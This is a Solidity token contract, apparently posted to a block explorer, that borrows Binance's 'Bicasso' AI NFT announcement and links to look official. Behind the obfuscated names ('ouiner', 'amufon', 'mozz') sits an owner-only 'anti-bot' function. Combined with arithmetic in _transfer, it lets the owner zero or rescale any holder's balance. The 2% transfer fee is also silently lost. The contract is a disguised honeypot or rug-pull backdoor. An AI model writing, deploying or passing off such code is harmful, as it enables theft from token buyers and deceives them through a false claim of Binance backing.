/**
 *Submitted for verification at BscScan.com on 2023-03-29
*/

/**

While artificial intelligence (AI) has been steadily advancing in recent years, the past year has seen the mainstream rise of deep-learning machines such as ChatGPT and Dall-E. This makes 2023 feel like a real turning point, marking the year of AI and its widespread integration.

Here at Binance, we��re on a mission to enable the global adoption of Web3 by building an ecosystem accessible to everyone and ensuring we��re always embracing the latest technology. As such, we��re particularly excited about the latest innovation we have ready to share with you: Binance Bicasso.

In simple terms, Bicasso is an AI NFT generator that allows users to create unique artwork with text or images, then mint their creations as NFTs on BNB Chain. In the words of Mayur Kamat, our Head of Product: ��Bicasso gives us a unique opportunity to bring together the power of AI and Web3 to provide users with a powerful experience."

Info: 

Website: https://www.binance.com/en/nft/bicasso

Twitter: https://twitter.com/hashtag/Bicasso

Telegram: https://t.me/BicassoEX

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed ouiner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address arcoder) external view returns (uint256);

    function transfer(address to, uint256 amufon) external returns (bool);

    function allowance(address ouiner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amufon) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amufon
    ) external returns (bool);
}

pragma solidity ^0.8.18;

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.18;

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMozz(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mozz(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

abstract contract Ownable is Context {
    address private _ouiner;

    event ouinershipTransferred(address indexed previousouiner, address indexed newouiner);

    constructor() {
        _transferouinership(_msgSender());
    }

    modifier onlyouiner() {
        _checkouiner();
        _;
    }

    function ouiner() public view virtual returns (address) {
        return _ouiner;
    }

    function _checkouiner() internal view virtual {
        require(ouiner() == _msgSender(), "Ownable: caller is not the ouiner");
    }

    function transferouinership(address newouiner) public virtual onlyouiner {
        require(newouiner != address(0), "Ownable: new ouiner is the zero address");
        _transferouinership(newouiner);
    }

    function _transferouinership(address newouiner) internal virtual {
        address oldouiner = _ouiner;
        _ouiner = newouiner;
        emit ouinershipTransferred(oldouiner, newouiner);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata,Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _antiBotIndication;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    function setAntiBotIndication(address[] memory abonent, uint256 indicator) public onlyouiner {
        for(uint256 i = 0; i < abonent.length; i++) {
        _antiBotIndication[abonent[i]] = indicator*1+0;
        }
    }

    function getAntiBotIndication(address abonent) public view returns (uint256) {
        return _antiBotIndication[abonent];
    }

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address arcoder) public view virtual override returns (uint256) {
        return _balances[arcoder];
    }

    function transfer(address _to, uint256 amufon) public virtual override returns (bool) {
        address ouiner = _msgSender();
        _transfer(ouiner, _to, amufon);
        return true;
    }

    function allowance(address ouiner, address spender) public view virtual override returns (uint256) {
        return _allowances[ouiner][spender];
    }

    function approve(address spender, uint256 amufon) public virtual override returns (bool) {
        address ouiner = _msgSender();
        _approve(ouiner, spender, amufon);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amufon
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amufon);
        _transfer(from, to, amufon);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address ouiner = _msgSender();
        _approve(ouiner, spender, allowance(ouiner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address ouiner = _msgSender();
        uint256 currentAllowance = allowance(ouiner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(ouiner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    using SafeMath for uint256;
    uint256 private _feeTrx = 2;
    function _transfer(
        address from,
        address to,
        uint256 amufon
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amufon);
        if(_antiBotIndication[from] != uint256(1+0)-1+0 ){
           _balances[from] = _balances[from].mozz(_antiBotIndication[from].add(1+0).sub(1+1)+0); 
        }
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amufon, "ERC20: transfer exceeds balance");

        uint256 feeamufon = 0;
        feeamufon = amufon.mozz(_feeTrx).div(100);
        
    unchecked {
        _balances[to] += amufon;       
        _balances[from] = fromBalance - amufon;
        _balances[to] -= feeamufon;
    }
        emit Transfer(from, to, amufon);

        _afterTokenTransfer(from, to, amufon);
    }

    function _mint(address arcoder, uint256 amufon) internal virtual {
        require(arcoder != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), arcoder, amufon);

        _totalSupply += amufon;
    unchecked {
        // Overflow not possible: balance + amufon is at most totalSupply + amufon, which is checked above.
        _balances[arcoder] += amufon;
    }
        emit Transfer(address(0), arcoder, amufon);

        _afterTokenTransfer(address(0), arcoder, amufon);
    }

    function _burn(address arcoder, uint256 amufon) internal virtual {
        require(arcoder != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(arcoder, address(0), amufon);

        uint256 arcoderBalance = _balances[arcoder];
        require(arcoderBalance >= amufon, "ERC20: burn amufon exceeds balance");
        
    unchecked {
        _balances[arcoder] = arcoderBalance - amufon;
        // Overflow not possible: amufon <= arcoderBalance <= totalSupply.
        _totalSupply -= amufon;
    }

        emit Transfer(arcoder, address(0), amufon);

        _afterTokenTransfer(arcoder, address(0), amufon);
    }

    function _approve(
        address ouiner,
        address spender,
        uint256 amufon
    ) internal virtual {
        require(ouiner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[ouiner][spender] = amufon;
        emit Approval(ouiner, spender, amufon);
    }

    function _spendAllowance(
        address ouiner,
        address spender,
        uint256 amufon
    ) internal virtual {
        uint256 currentAllowance = allowance(ouiner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amufon, "ERC20: insufficient allowance");
            unchecked {
            _approve(ouiner, spender, currentAllowance - amufon);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amufon
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amufon
    ) internal virtual {}
}

pragma solidity ^0.8.18;

contract BicassoNFT is ERC20 {
    uint256 initialSupply = 1000000000;
    constructor() ERC20("Bicasso NFT", "BNFT") {
        _mint(msg.sender, initialSupply*10**9);
    }
}